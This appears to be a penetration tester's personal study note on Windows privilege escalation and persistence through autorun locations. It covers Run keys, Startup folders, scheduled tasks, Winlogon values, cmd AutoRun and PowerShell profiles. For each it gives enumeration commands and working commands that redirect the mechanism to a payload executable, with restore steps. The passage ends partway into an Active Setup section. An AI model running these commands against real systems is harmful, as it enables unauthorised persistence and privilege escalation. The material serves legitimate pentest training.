---
created: 2026-08-26
updated: 2026-10-04
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---
- [
>[!note] [`schtasks`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) · [`Get-ScheduledTask`](https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask)

>[!abstract]+ **Scope**: Local Windows privilege escalation and persistence via misconfigured autorun registry keys, startup directories, scheduled tasks, Winlogon configurations, PowerShell profiles, Command Processor `AutoRun`, WMI event subscriptions, and advanced auto-start locations.

- [ ] Enumerate system-wide and user-specific autorun registry keys (`HKLM` and `HKCU`).
- [ ] Audit permissions on autorun binaries, parent directories, and registry keys (`icacls`, `accesschk.exe`, `Get-Acl`).
- [ ] Inspect all-users and per-user `Startup` folders for modifiable executables, batch scripts, or `.lnk` shortcuts.
- [ ] Audit scheduled tasks executing under privileged accounts (`SYSTEM`, `Administrators`) for writable binary paths.
- [ ] Inspect Winlogon configuration (`Shell` and `Userinit` values) and Command Processor `AutoRun` keys.
- [ ] Check write permissions on custom PowerShell profile script paths across all host configurations.
- [ ] Execute automated autorun audits using `autorunsc.exe`, `SharpUp.exe`, or `PowerUp.ps1`.
- [ ] Replace writable autorun executables/shortcuts or modify registry value paths to point to your payload.
- [ ] Trigger execution via system reboot, user logon, scheduled trigger, or targeted process invocation.
- [ ] Verify elevated execution (`SYSTEM` or Administrator access) and restore original files/registry keys.

## Auto-start extensibility points

Windows exposes numerous **Auto-Start Extensibility Points (ASEPs)**, including registry keys, `Startup` folders, services, scheduled tasks, shell integrations, and other mechanisms that automatically execute code in response to system startup, user logon, or application events.

Privilege escalation via autoruns occurs when an auto-starting entry executes under a higher-privileged security context (`SYSTEM`, local Administrator, or domain user) and contains a permission misconfiguration. You can exploit these misconfigurations through four primary conditions:

- **Modifiable auto-start configuration:** The registry key, shortcut, or task definition specifying the autorun path allows low-privileged users to alter the command line or target path string.
- **Modifiable referenced executable, script, or DLL:** The configured autorun binary, script, or DLL can be modified or overwritten directly by low-privileged users.
- **Writable parent or search-path location:** The directory containing the autorun executable grants write permissions to low-privileged users, enabling binary replacement or search-order hijacking.
- **Modifiable indirection object:** A `.lnk` shortcut in the all-users `Startup` folder or secondary configuration object can be edited to redirect its target path or arguments to a payload.

- If you can modify an auto-start configuration, the executable it references, or a filesystem path used to resolve that component, you may be able to influence subsequent execution and cause arbitrary code to run.
- The code executes in the security context associated with the ASEP mechanism. This leads to privilege escalation if the affected mechanism runs under a more privileged security context than your current session (such as `SYSTEM` or an administrator).

### User-specific and machine-wide autoruns

#### User-specific autoruns

- **User-specific autoruns** are configured for a particular user account and are normally triggered by events associated with that user's session, such as interactive logon. They generally affect only that user.
- Examples include:
    - **`Run` and `RunOnce` registry keys under `HKEY_CURRENT_USER` (`HKCU`)** — commands registered here execute when that user logs on interactively:
        - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
        - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`
    - **Per-user `Startup` folder** — shortcuts or executable files placed here execute when that user logs on interactively:
        - `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
    - **User-specific scheduled tasks**

#### Machine-wide autoruns

- **Machine-wide autoruns** are configured in system-level locations and affect multiple users or system components. Depending on the mechanism, they may execute during boot, service initialization, or interactive user logon.
- Examples include:
    - **`Run` and `RunOnce` registry keys under `HKEY_LOCAL_MACHINE` (`HKLM`)** — commands registered here are processed when a user logs on to the system:
        - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
        - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`
    - **All-users `Startup` folder** — shortcuts or executable files placed here are processed when a user logs on interactively:
        - `%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup`
    - **Machine-wide scheduled tasks** — tasks can be configured to execute at system startup, user logon, a scheduled time, or another operating-system event, and run under configured principals such as a user account, service account, or `SYSTEM`.
    - **Winlogon configuration** — system-wide logon behavior:
        - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
    - **Machine-wide Group Policy startup scripts**
    - **System-wide shell extensions and COM registrations**
    - **Boot-start and system-start drivers** — kernel drivers registered under `HKLM\SYSTEM\CurrentControlSet\Services` can be configured to load during early system initialization.

- Machine-wide auto-start locations commonly require administrative rights to modify. Configuration scope does not determine execution context: some mechanisms execute as `SYSTEM` during boot or service initialization, while others execute in the security context of the user logging on interactively.

>[!note] Boot-start drivers, system services, `BootExecute`, and similar mechanisms can execute before interactive logon.

## Enumerating autoruns automatically

### `Autoruns`

- [`Autoruns`](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns) (from the Sysinternals suite) provides a detailed view of most auto-start locations in Windows. It displays programs, drivers, services, and shell extensions configured to run during system boot, user logon, or application startup.

---

- Query autoruns across all categories (hiding Microsoft entries):

```powershell
autorunsc.exe -m -a * -ct /accepteula
```

- Export logon-startup entries as CSV:

```powershell
autorunsc.exe -m -a l -c /accepteula > autoruns.csv
```

| Option | Description |
| :--- | :--- |
| `-a` | Select autostart entries. |
| `-c` | Print output as CSV. |
| `-ct` | Print output as tab-delimited values. |
| `-h` | Show file hashes. |
| `-m` | Hide Microsoft entries (signed entries if used with `-v`). |
| `-v`[`rs`] | Query [`VirusTotal`](https://www.virustotal.com/) for malware based on file hash.<br>`r` — Open reports for files for which `VirusTotal` detected something.<br>`s` — Upload files reported as not previously scanned to `VirusTotal`. It may take a while to pull results from `VirusTotal`. |

>[!note] See [`Autoruns — Microsoft Sysinternals`](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns).

- Auto-start entries you can select using `-a`:

| Selection | Description |
| :--- | :--- |
| `*` | All. |
| `b` | Boot execute. |
| `d` | AppInit DLLs. |
| `e` | Explorer addons. |
| `g` | Sidebar gadgets (Vista and higher). |
| `h` | Image hijacks. |
| `i` | Internet Explorer addons. |
| `k` | Known DLLs. |
| `l` | Logon startups (default). |
| `m` | WMI entries. |
| `n` | Winsock protocol and network providers. |
| `o` | Codecs. |
| `p` | Printer monitor DLLs. |
| `r` | LSA security providers. |
| `s` | Autostart services and non-disabled drivers. |
| `t` | Scheduled tasks. |
| `w` | Winlogon entries. |
>[!note] [`Autoruns`](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
### PowerUp & SharpUp

- Check autorun locations for entries that the current user can modify using [`Get-ModifiableRegistryAutoRun`](https://powersploit.readthedocs.io/en/latest/Privesc/Get-ModifiableRegistryAutoRun/) (PowerView):

```powershell
Import-Module .\PowerUp.ps1
```

```powershell
Get-ModifiableRegistryAutoRun
```

- Identify modifiable registry autoruns using [`SharpUp`](https://github.com/GhostPack/SharpUp):

```powershell
.\SharpUp.exe audit RegistryAutoruns
```

>[!note] [`PowerUp`](https://powersploit.readthedocs.io/en/latest/) · [`SharpUp`](https://github.com/GhostPack/SharpUp)

### winPEAS

- Check autoruns using [`winPEAS`](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS):

```powershell
.\winPEASany.exe quiet autoruns
```

>[!note] [`winPEAS`](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

## Exploiting writable `Run` and `RunOnce` registry keys

### `Run` and `RunOnce` registry keys

- During interactive user logon, Windows checks machine-wide and user-specific `Run` and `RunOnce` registry keys to start configured programs automatically.

- **Machine-wide `Run`/`RunOnce` registry keys** are located under `HKEY_LOCAL_MACHINE` (`HKLM`):
    - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
    - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- **User-specific `Run`/`RunOnce` registry keys** are located under `HKEY_CURRENT_USER` (`HKCU`):
    - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
    - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`

- `HKCU` entries apply only to the user for which they are configured; `HKLM` entries are processed for all applicable user logons.
- `Run` entries are intended to execute each time the applicable user logs on interactively. Execution is not necessarily immediate; Windows may delay startup programs for performance reasons.
- `RunOnce` entries execute once. By default, a `RunOnce` value is removed before its command is executed; prefixing the value name with `!` defers removal until after the command runs.
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce` has an additional restriction: it is processed only when a member of the local `Administrators` group logs on after a reboot.
- Programs started through these keys execute in the security context of the user who is logging on interactively.

>[!note] By default, `Run` and `RunOnce` keys are ignored when the computer is started in Safe Mode. Prefix a `RunOnce` value name with `*` to force execution in Safe Mode.

>[!important] A machine-wide `Run` or `RunOnce` entry does **not** inherently run as `SYSTEM`; the resulting process security context depends on the logging-on user's token and Windows security mechanisms such as UAC.

>[!note] See [`Run and RunOnce Registry Keys — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys).

---

>[!bug] If you can modify a machine-wide `Run`/`RunOnce` entry, the executable it references, or a filesystem path used to resolve that executable, you may be able to cause arbitrary code to execute when an applicable user logs on. The code normally runs in that user's security context.

### Enumerating machine-wide `Run` and `RunOnce` keys

- Check `Run` and `RunOnce` entries using PowerShell:

```powershell
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
```

```powershell
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce'
```

- In CMD:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
```

>[!tip]+
> - On 64-bit Windows, also check machine-wide auto-start entries for 32-bit applications (`HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`):
> 
> ```powershell
> Get-ItemProperty 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
> reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
> ```

#### Checking registry key permissions

- Inspect permissions on the machine-wide `Run` and `RunOnce` registry keys using [`AccessChk`](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) (from the Sysinternals Suite):

```powershell
accesschk.exe -k -l "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```

```powershell
accesschk.exe -k -l "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
```

- Only check for write permissions:

```powershell
accesschk.exe -k -w "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```

```powershell
accesschk.exe -k -w "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
```

- To inspect permissions granted to a specific user or group, specify the account name:

```powershell
accesschk.exe -k -w "Users" "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```

```powershell
accesschk.exe -k -w "Users" "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
```

| Option | Description |
| :--- | :--- |
| `-k` | Treat the target as a registry key. |
| `-v` | Verbose output. |
| `-u` | Suppress errors. |
| `-l` | Show full security descriptor. Add `-i` to ignore inherited ACEs. |
| `-i` | Ignore objects with only inherited ACEs when dumping full access control lists. |
| `-w` | Only check for write permissions. |

- Inspect registry key ACLs with [`Get-Acl`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl):

```powershell
Get-Acl 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' | Format-List
```

```powershell
Get-Acl 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce' | Format-List
```

- Focus on permissions granted to common low-privilege groups:

```powershell
(Get-Acl 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run').Access |
    Where-Object {$_.IdentityReference -match 'Users|Everyone|Authenticated Users'}
```

>[!note] Review the `RegistryRights` and `AccessControlType` fields to determine whether the listed identities have effective write access.

#### Checking permissions of target executables

- Check permissions on the referenced executable path specified by the autorun entry:

```powershell
accesschk.exe -wvu "C:\Program Files\Vendor\AutorunApp.exe" /accepteula
```

```powershell
icacls "C:\Program Files\Vendor\AutorunApp.exe"
```

```powershell
Get-Acl 'C:\Program Files\Vendor\AutorunApp.exe' | Format-List
```

>[!note] If you have effective write access to a parent directory of the referenced executable, you may be able to rename or replace it even if you cannot modify the executable file directly.

- Check permissions of all parent directories along the executable path:

```powershell
icacls "C:\Program Files\Vendor\"
icacls "C:\Program Files\"
icacls "C:\"
```

### Exploiting modifiable `Run` registry keys or executables

#### Exploiting writable target executable

>[!bug] If you have effective write access to the referenced executable or its parent directory, you can replace or modify the executable so the auto-start launches your payload.

>[!tip]+ Back up the original binary:
> ```powershell
> Copy-Item 'C:\Program Files\Vendor\AutorunApp.exe' 'C:\Program Files\Vendor\AutorunApp.exe.bak'
> ```
>
> ```powershell
> copy "C:\Program Files\Vendor\AutorunApp.exe" "C:\Program Files\Vendor\AutorunApp.exe.bak"
> ```

- Replace the referenced executable with your payload:

```powershell
Copy-Item 'C:\PrivEsc\payload.exe' 'C:\Program Files\Vendor\AutorunApp.exe' -Force
```

```powershell
copy /y "C:\PrivEsc\payload.exe" "C:\Program Files\Vendor\AutorunApp.exe"
```

- Wait for an administrative user interactive logon to trigger execution.

>[!tip]+ Restore the original binary:
> ```powershell
> Copy-Item 'C:\Program Files\Vendor\AutorunApp.exe.bak' 'C:\Program Files\Vendor\AutorunApp.exe' -Force
> ```

#### Exploiting writable registry key permissions

>[!bug] If your account has `SetValue` or `FullControl` access on `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, you can change the autorun registry value to reference your custom executable.

- Change the autorun registry value to point directly to your payload:

```powershell
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'VendorApp' -Value 'C:\PrivEsc\payload.exe'
```

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "VendorApp" /t REG_SZ /d "C:\PrivEsc\payload.exe" /f
```

- Wait for an administrative user interactive logon to trigger execution.

>[!tip]+
>- Restore the original registry value:
>```powershell
>reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "VendorApp" /t REG_SZ /d "C:\Program Files\Vendor\AutorunApp.exe" /f
>```
>

## Writable `Startup` folder binaries and shortcuts

### `Startup` directories

- Files placed in `Startup` directories run automatically when the associated user logs on interactively. Windows provides a per-user `Startup` folder and an all-users `Startup` folder.

>[!note] `Startup`-folder items are processed as part of interactive user logon.

- **Per-user `Startup` folder** is located at `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
    - Executables in the per-user `Startup` folder are launched when that specific user logs on interactively and apply only to that user session.
- **All-users `Startup` folder** is located at `%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup`
    - Executables in the all-users `Startup` folder are processed for every user who logs on interactively and execute in the security context of the logging-on user.

- Typically, these directories contain **shortcuts (`.lnk`)**, though executable files or scripts can also be placed directly there.

---

>[!bug] If you can modify an executable in the all-users `Startup` folder, its shortcut target, or a referenced executable, you may be able to cause arbitrary code to execute when another user logs on interactively. The resulting process runs in that user's security context.

### Enumerating `Startup` directories

- Check all-users and user-specific `Startup` directories using PowerShell:

```powershell
Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup' -Force
```

```powershell
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -Force
```

- In CMD:

```powershell
dir /a "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

```powershell
dir /a "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

- Check ACLs on the all-users `Startup` folder:

```powershell
accesschk.exe -dvu "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" /accepteula
```

```powershell
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

```powershell
Get-Acl 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup' | Format-Table
```

- Check permissions on files inside the all-users `Startup` folder:

```powershell
Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup' | ForEach-Object { Get-Acl $_.FullName }
```

```powershell
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\*"
```

### Exploiting `Startup` folders

#### Dropping a payload executable or script

>[!bug] If your account has effective write access to the all-users `Startup` folder (`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`), placing your executable there causes it to be processed when a user logs on interactively.

- Copy your payload executable directly into the all-users `Startup` folder:

```powershell
Copy-Item 'C:\PrivEsc\payload.exe' 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe'
```

```powershell
copy "C:\PrivEsc\payload.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
```

- Alternatively, drop a batch file (`update.bat`) containing a quoted executable path:

```powershell
Set-Content -Path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.bat' -Value '"C:\PrivEsc\payload.exe"'
```

```powershell
echo "C:\PrivEsc\payload.exe" > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.bat"
```

#### Hijacking shortcut `.lnk` targets

>[!bug] If a `.lnk` shortcut exists in `Startup` pointing to a target binary, but you have write access to the `.lnk` file itself or to the referenced executable path, you can modify the shortcut or its target so the you executable runs instead.

- Modify the shortcut target using the `WScript.Shell` COM object:

```powershell
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut('C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\App.lnk')
$Shortcut.TargetPath = 'C:\PrivEsc\payload.exe'
$Shortcut.Save()
```

- When the affected user logs on, Windows resolves the shortcut and launches the configured target.

>[!tip]+
>- Confirm execution when an administrative user establishes an interactive session:
>  ```powershell
>  Get-Process payload
>  ```
>- Remove files you added and restore any shortcut or target you modified:
>  ```powershell
>  Remove-Item 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe' -Force
>  ```
>  ```powershell
>  del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
>  ```
## Writable scheduled tasks

### Scheduled tasks

- **Scheduled Tasks** allow Windows to launch programs, commands, or scripts automatically when configured triggers occur.
- A scheduled task consists of four main components:
    - **Triggers** — define when the task starts (at system startup, user logon, specific schedule, system idle state, logged event, session state change, or registration).
    - **Actions** — define the action executable or script launched by the task.
    - **Principal** — defines the account, logon type, and privilege level under which the task executes.
    - **Conditions and settings** — impose execution requirements and control task behavior.
- Supported task triggers include:
    - At a specific time or recurring schedule.
    - At system startup.
    - At user logon.
    - When the system becomes idle.
    - When a specified event is logged.
    - When a user session changes state.
    - On task registration, when configured.

>[!note] A task can have multiple triggers. When any enabled trigger's conditions are satisfied, Task Scheduler starts the configured action.

- Unlike `Run` registry entries or `Startup`-folder items, a scheduled task does not necessarily execute in the security context of the currently logged-on user. Its execution context is determined by the task's configured principal and logon settings.
- Task definition files are stored under `C:\Windows\System32\Tasks`; Task Scheduler also maintains task registration metadata.

---

> [!bug] If you can modify a task that runs under a more privileged account, modify its referenced action executable or script, or influence how its action path is resolved, you can obtain code execution under the task's configured principal (such as `SYSTEM` or another privileged account) when its trigger occurs.

### Enumerating scheduled tasks and permissions

![[Manual & automated Windows enumeration#Enumerating scheduled tasks]].
![[Manual & automated Windows enumeration#Privileged scheduled tasks]].
![[Manual & automated Windows enumeration#Task binary and directory permissions]].

### Exploiting writable scheduled tasks

#### Exploiting writable target script or executable

> [!bug] If a scheduled task running under a privileged security context (such as `SYSTEM`) executes a script or binary that your account can modify, you can replace or append to that target to gain elevated code execution when the task triggers.

- Append your payload to a writable script (`MaintenanceScript.ps1`):

```powershell
Add-Content -Path 'C:\Tasks\MaintenanceScript.ps1' -Value "Start-Process 'C:\PrivEsc\payload.exe'"
```

```powershell
echo Start-Process 'C:\PrivEsc\payload.exe' >> "C:\Tasks\MaintenanceScript.ps1"
```

- If the task references an executable (`C:\Tasks\Cleaner.exe`), overwrite the executable directly:

```powershell
Copy-Item 'C:\PrivEsc\payload.exe' 'C:\Tasks\Cleaner.exe' -Force
```

```powershell
copy /y "C:\PrivEsc\payload.exe" "C:\Tasks\Cleaner.exe"
```

- Wait for the configured trigger, or start the task manually if your account has the required permissions:

```powershell
Start-ScheduledTask -TaskName 'SystemMaintenance'
```

```powershell
schtasks /run /tn "SystemMaintenance"
```

> [!tip]+
> - Confirm process execution under the target security context:
>   ```powershell
>   Get-Process payload
>   ```
> - Restore the original script or binary file:
>   ```powershell
>   Copy-Item 'C:\Tasks\Cleaner.exe.bak' 'C:\Tasks\Cleaner.exe' -Force
>   ```

#### Exploiting modifiable task definitions

> [!bug] If your account has permission to update a registered task definition, you can modify its action path string to execute a custom payload under the task's configured principal.

- Modify the task action path using `schtasks`:

```powershell
schtasks /change /tn "SystemMaintenance" /tr "C:\PrivEsc\payload.exe"
```

- Start the task and verify elevated process execution.

> [!tip]+
> - Restore the original task action path:
>   ```powershell
>   schtasks /change /tn "SystemMaintenance" /tr "C:\Tasks\Cleaner.exe"
>   ```

## Modifiable Winlogon configuration

### Winlogon configuration

- Winlogon manages interactive user logons. During logon, Winlogon reads configuration values from `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
    - `Userinit`: Specifies programs executed when a user logs on (defaults to `C:\Windows\system32\userinit.exe,`).
    - `Shell`: Specifies the desktop environment shell executable (defaults to `explorer.exe`).

> [!bug] If your account can modify these registry values or overwrite referenced executables, altering these values causes additional code to execute during interactive user logons.

> [!note] See [`Winlogon and Userinit logon behavior — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/secauthn/msgina-dll-features).

### Enumerating Winlogon registry keys

- Query Winlogon registry values using PowerShell:

```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object Shell, Userinit
```

- In CMD:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell
```

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
```

#### Checking registry key permissions

- Inspect permissions on the Winlogon registry key:

```powershell
(Get-Acl 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon').Access | Where-Object {$_.IdentityReference -match 'Users|Everyone|Authenticated Users'}
```

```powershell
accesschk.exe -kvu "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /accepteula
```

### Exploiting Winlogon misconfigurations

#### Exploiting modifiable `Userinit` registry value

> [!bug] If your account has `SetValue` write access to `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, appending a payload path to `Userinit` executes your binary during interactive user logon.

- Append your payload executable path to `Userinit` (retaining the separating comma):

```powershell
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name 'Userinit' -Value 'C:\Windows\system32\userinit.exe,C:\PrivEsc\payload.exe,'
```

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\PrivEsc\payload.exe," /f
```

- During the next interactive logon, the configured `Userinit` programs start in the logging-on user's security context.

> [!tip]+
> - Confirm process execution upon interactive logon.
> - Restore the default `Userinit` value immediately to prevent breaking desktop logons:
>   ```powershell
>   reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f
>   ```

#### Exploiting modifiable `Shell` registry value

> [!bug] If your account can modify the `Shell` registry value under Winlogon, appending a payload executable path alongside `explorer.exe` causes it to launch when a user logs on.

- Modify the `Shell` value to include your payload executable:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,C:\PrivEsc\payload.exe" /f
```

- Wait for an interactive user logon to trigger execution.

> [!tip]+
> - Restore the default `Shell` value:
>   ```powershell
>   reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f
>   ```

## Command Processor `AutoRun` registry key

### Command Processor `AutoRun`

- The Windows Command Processor (`cmd.exe`) reads an `AutoRun` registry string value from `HKLM` or `HKCU` under `Software\Microsoft\Command Processor`.
- Unless `/d` is specified, `cmd.exe` checks `HKLM\Software\Microsoft\Command Processor` and `HKCU\Software\Microsoft\Command Processor` when `cmd.exe` starts. Passing `/d` disables processing of `AutoRun` commands.
- If a privileged process starts `cmd.exe` without `/d`, any configured `AutoRun` command is processed in that `cmd.exe` process's security context.

> [!note] See [`cmd.exe — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd).

### Enumerating Command Processor `AutoRun` keys

- Query Command Processor registry entries using PowerShell:

```powershell
Get-ItemProperty 'HKLM:\Software\Microsoft\Command Processor' -ErrorAction SilentlyContinue
```

```powershell
Get-ItemProperty 'HKCU:\Software\Microsoft\Command Processor' -ErrorAction SilentlyContinue
```

- In CMD:

```powershell
reg query "HKLM\Software\Microsoft\Command Processor" /v AutoRun
```

```powershell
reg query "HKCU\Software\Microsoft\Command Processor" /v AutoRun
```

#### Checking registry key permissions

- Inspect permissions on the `Command Processor` registry key:

```powershell
(Get-Acl 'HKLM:\Software\Microsoft\Command Processor').Access
```

```powershell
accesschk.exe -kvu "HKLM\Software\Microsoft\Command Processor" /accepteula
```

### Exploiting Command Processor `AutoRun`

#### Exploiting modifiable `AutoRun` registry value

> [!bug] If your account has write permissions on `HKLM\Software\Microsoft\Command Processor`, setting the `AutoRun` string value executes your payload whenever any process launches `cmd.exe` without the `/d` switch.

- Set the `AutoRun` registry value to launch your payload:

```powershell
Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Command Processor' -Name 'AutoRun' -Value 'C:\PrivEsc\payload.exe'
```

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "C:\PrivEsc\payload.exe" /f
```

- Trigger execution by starting any script or process that invokes `cmd.exe` without `/d`.

> [!tip]+
> - Verify process creation when `cmd.exe` starts under a target security context.
> - Delete the `AutoRun` registry value:
>   ```powershell
>   Remove-ItemProperty -Path 'HKLM:\Software\Microsoft\Command Processor' -Name 'AutoRun'
>   ```
>   ```powershell
>   reg delete "HKLM\Software\Microsoft\Command Processor" /v AutoRun /f
>   ```

## Modifiable PowerShell profiles

### PowerShell profiles

- PowerShell host environments execute profile scripts automatically during startup. Profile locations vary by edition, host, user, and installation path:
    - **Windows PowerShell 5.1**
        - `$PROFILE.AllUsersAllHosts` (`C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1`)
        - `$PROFILE.AllUsersCurrentHost` (`C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1`)
        - `$PROFILE.CurrentUserAllHosts` (`%USERPROFILE%\Documents\WindowsPowerShell\profile.ps1`)
        - `$PROFILE.CurrentUserCurrentHost` (`%USERPROFILE%\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1`)
    - **PowerShell 7+**
        - `$PROFILE.AllUsersAllHosts` (`$PSHOME\profile.ps1`)
        - `$PROFILE.AllUsersCurrentHost` (`$PSHOME\Microsoft.PowerShell_profile.ps1`)
        - `$PROFILE.CurrentUserAllHosts` (`$HOME\Documents\PowerShell\profile.ps1`)
        - `$PROFILE.CurrentUserCurrentHost` (`$HOME\Documents\PowerShell\Microsoft.PowerShell_profile.ps1`)

- The four profile scripts execute in a defined order, with host-specific and user-specific profiles loading after all-users profiles. Specifying `-NoProfile` during host invocation prevents profile loading.
- If a privileged PowerShell host starts normally without `-NoProfile` and loads an affected all-users profile, commands in that profile execute in the host process's security context.

> [!note] See [`about_Profiles — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles).

### Enumerating PowerShell profiles

- Display profile script locations using `$PROFILE`:

```powershell
$PROFILE | Format-List *
```

- Test path existence and check ACL permissions across profile paths:

```powershell
$PROFILE.PSObject.Properties | ForEach-Object {
    $path = $_.Value
    if (Test-Path $path) {
        Get-Acl $path | Select-Object Path, AccessToString
    } else {
        Write-Host "Profile path does not exist: $path"
    }
}
```

- Inspect permissions on `AllUsers` profile files:

```powershell
icacls "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"
```

```powershell
icacls "C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1"
```

```powershell
accesschk.exe -wvu "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1" /accepteula
```

### Exploiting modifiable PowerShell profiles

#### Exploiting writable PowerShell profile script

> [!bug] If you can modify an existing all-users PowerShell profile or create one in a directory with writable parent permissions, appending payload execution commands runs your binary when a privileged PowerShell session initializes without `-NoProfile`.

- Append code to the profile file to launch your payload:

```powershell
Add-Content -Path $PROFILE.AllUsersAllHosts -Value 'Start-Process "C:\PrivEsc\payload.exe"'
```

```powershell
echo Start-Process "C:\PrivEsc\payload.exe" >> "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"
```

- Trigger execution by starting a PowerShell host under a privileged context without `-NoProfile`.

> [!tip]+
> - Confirm execution when an affected PowerShell host starts under a privileged context.
> - Restore original profile contents or remove added lines.

## Other auto-start mechanisms

### Active Setup (`StubPath`)

- Active Setup executes a component's `StubPath` command during interactive logon when machine-wide component registration requires initialization for the logging-on user.
- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\<GUID>` (with per-user state tracked under `HKCU\Software\Microsoft\Active Setup\Installed Components\<GUID>`).

- Query Active Setup `StubPath` entries using PowerShell:

